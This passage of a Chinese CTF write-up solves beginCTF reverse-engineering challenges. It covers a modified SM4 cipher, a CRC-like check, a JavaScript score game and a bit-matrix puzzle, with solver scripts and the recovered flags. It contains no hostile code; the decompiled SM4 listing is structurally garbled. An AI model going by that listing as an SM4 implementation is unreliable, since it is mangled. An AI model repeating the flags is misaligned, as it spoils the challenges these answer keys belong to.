punctuation">)</span>        ulbuf<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> get_uint32_be<span class="token punctuation">(</span>in_put<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> idx <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>_f<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ulbuf<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            out_put <span class="token operator">+=</span> put_uint32_be<span class="token punctuation">(</span>ulbuf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> out_put    <span class="token keyword">def</span> <span class="token function">crypt_ecb</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>        input_data <span class="token operator">=</span> bytes_to_list<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mode <span class="token operator">==</span> SM4_ENCRYPT<span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> PKCS7<span class="token punctuation">:</span>                input_data <span class="token operator">=</span> pkcs7_padding<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> ZERO<span class="token punctuation">:</span>                    input_data <span class="token operator">=</span> zero_padding<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            i <span class="token operator">=</span> <span class="token number">0</span>            output_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                    output_data <span class="token operator">+=</span> self<span class="token punctuation">.</span>one_round<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sk<span class="token punctuation">,</span> input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">16</span>                    length <span class="token operator">-=</span> <span class="token number">16</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mode <span class="token operator">==</span> SM4_DECRYPT<span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> PKCS7<span class="token punctuation">:</span>                <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>pkcs7_unpadding<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>padding_mode <span class="token operator">==</span> ZERO<span class="token punctuation">:</span>                <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>zero_unpadding<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">crypt_cbc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> input_data<span class="token punctuation">)</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token number">0</span>        output_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        tmp_input <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">16</span>        iv <span class="token operator">=</span> bytes_to_list<span class="token punctuation">(</span>iv<span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>mode <span class="token operator">==</span> SM4_ENCRYPT<span class="token punctuation">:</span>            input_data <span class="token operator">=</span> pkcs7_padding<span class="token punctuation">(</span>bytes_to_list<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span><span class="token punctuation">)</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                    tmp_input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> xor<span class="token punctuation">(</span>input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> iv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    output_data <span class="token operator">+=</span> self<span class="token punctuation">.</span>one_round<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sk<span class="token punctuation">,</span> tmp_input<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    iv <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>output_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">16</span>                    length <span class="token operator">-=</span> <span class="token number">16</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span>            length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                    output_data <span class="token operator">+=</span> self<span class="token punctuation">.</span>one_round<span class="token punctuation">(</span>self<span class="token punctuation">.</span>sk<span class="token punctuation">,</span> input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    output_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> xor<span class="token punctuation">(</span>output_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> iv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    iv <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>input_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    i <span class="token operator">+=</span> <span class="token number">16</span>                    length <span class="token operator">-=</span> <span class="token number">16</span>        <span class="token keyword">return</span> list_to_bytes<span class="token punctuation">(</span>pkcs7_unpadding<span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># okay decompiling C:\Users\Npc\Desktop\CTF\beginCTF\beginctfRE\ezpython\ezpython.exe_extracted\PYZ-00.pyz_extracted\gmssl\sm4.pyc</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接SM4一把梭，结果发现得不到flag，猜测SM4加密算法进行了魔改</p><p><img src="https://s2.loli.net/2024/02/21/1UilPSmLHXTG2Od.png" alt="" / loading="lazy"></p><p>diff一下sm4源码发现key多^了个37，直接在原有的基础上写解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">pad_pkcs7</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7填充"""</span>    padding_len <span class="token operator">=</span> <span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span>    padding <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>padding_len<span class="token punctuation">]</span> <span class="token operator">*</span> padding_len<span class="token punctuation">)</span>    <span class="token keyword">return</span> data <span class="token operator">+</span> padding<span class="token keyword">def</span> <span class="token function">unpad_pkcs7</span><span class="token punctuation">(</span>padded_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""PKCS#7去填充"""</span>    padding_len <span class="token operator">=</span> padded_data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> padded_data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span>padding_len<span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">SM4</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>gmsm4 <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">decryptSM4</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> encrypt_key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        gmsm4 <span class="token operator">=</span> self<span class="token punctuation">.</span>gmsm4        gmsm4<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>encrypt_key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_DECRYPT<span class="token punctuation">)</span>        padded_value <span class="token operator">=</span> pad_pkcs7<span class="token punctuation">(</span>value<span class="token punctuation">)</span>        decrypt_value <span class="token operator">=</span> gmsm4<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_value<span class="token punctuation">)</span>        <span class="token keyword">return</span> decrypt_value<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key1 <span class="token operator">=</span> <span class="token string">'BeginCTFBeginCTF'</span>    key<span class="token operator">=</span><span class="token string">''</span>    enc <span class="token operator">=</span> <span class="token string">b'JmjJEAJGMT6F9bmC+Vyxy8Z1lpfaJzdEX6BGG/qgqUjUpQaYSON1CnZyX9YXTEClSRYm7PFZtGxmJw6LPuw1ww=='</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> key1<span class="token punctuation">:</span>        key<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">37</span><span class="token punctuation">)</span>    sm4_instance <span class="token operator">=</span> SM4<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> sm4_instance<span class="token punctuation">.</span>decryptSM4<span class="token punctuation">(</span>key<span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;Pay_M0re_@ttention_to_th3_key!!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="出题人的密码是什么"><a class="markdownIt-Anchor" href="#出题人的密码是什么"></a> <strong>出题人的密码是什么</strong></h2><p>先查壳，无壳，直接ida打开</p><p>最后得到函数主逻辑</p><p><img src="https://s2.loli.net/2024/02/23/QoZcNYhWR1dygJx.png" alt="" / loading="lazy"></p><p>想找到函数加密的逻辑只能一个一个地翻函数，翻了三十多个，找到了账号的加密方式</p><p><img src="https://s2.loli.net/2024/02/22/OyvgrG5cQiVK2lp.png" alt="" / loading="lazy"></p><p><img src="https://s2.loli.net/2024/02/22/xhRJdw3MGiLSZyf.png" alt="" / loading="lazy"></p><p>从二进制角度理解更容易逆向</p><p>和0比较实际上是比较最高位（标志位）是0还是1：</p><ul><li>如果是1(负数），就左移一位（*2）与key异或</li><li>由于key最后一位是1，v6左移一位最后一位是0，异或结果最后一位必然是1。因此逆向的时候，如果一次加密后最后一位是1，这次加密前它肯定是负数</li><li>如果是0（正数），就左移一位，最后一位就变成0。同理，最后一位是0的本次加密前一定是正数。</li></ul><p>类似CRC的部分需要动调获得key的值，虽然是随机生成的但是其值不变</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">enc1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">]</span>key <span class="token operator">=</span> <span class="token number">0x33077D</span>enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#异或部分逆向</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    b<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>enc1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">0x25</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>    enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token comment">#CRC部分加密</span><span class="token keyword">def</span> <span class="token function">decrc</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> value<span class="token operator">&amp;</span><span class="token number">1</span> <span class="token punctuation">:</span>            value<span class="token operator">=</span><span class="token punctuation">(</span>value<span class="token operator">^</span>key<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token comment">#最后一位是1，加密前肯定是负数</span>            value <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">0x8000000000000000</span>         <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#最后一位是0，加密前必为正数</span>            value<span class="token operator">=</span>value<span class="token operator">>></span><span class="token number">1</span>    <span class="token keyword">return</span> valueflag<span class="token operator">=</span><span class="token string">b''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc1<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'little'</span><span class="token punctuation">)</span>    flag<span class="token operator">+=</span>decrc<span class="token punctuation">(</span>enc1<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'little'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'begin&#123;Th1s_reverse_pr0blem_may_t@ke_some_time#!&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="stick-game"><a class="markdownIt-Anchor" href="#stick-game"></a> <strong>stick game</strong></h2><p>使用js在线工具格式化然后这是混淆后的代码，找到score发生改变 的位置，手动给score加点分</p><p><img src="https://s2.loli.net/2024/02/22/YFfrJszD6oeAGXd.png" alt="" / loading="lazy"></p><p><img src="https://s2.loli.net/2024/02/22/n9vOaqhjXDYUoWy.png" alt="" / loading="lazy"></p><h2 id="arc"><a class="markdownIt-Anchor" href="#arc"></a> <strong>Arc</strong></h2><p>这题的基本思路是这样的</p><p><img src="https://s2.loli.net/2024/02/24/ywEIHKjr8zYoZhL.png" alt="" / loading="lazy"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token 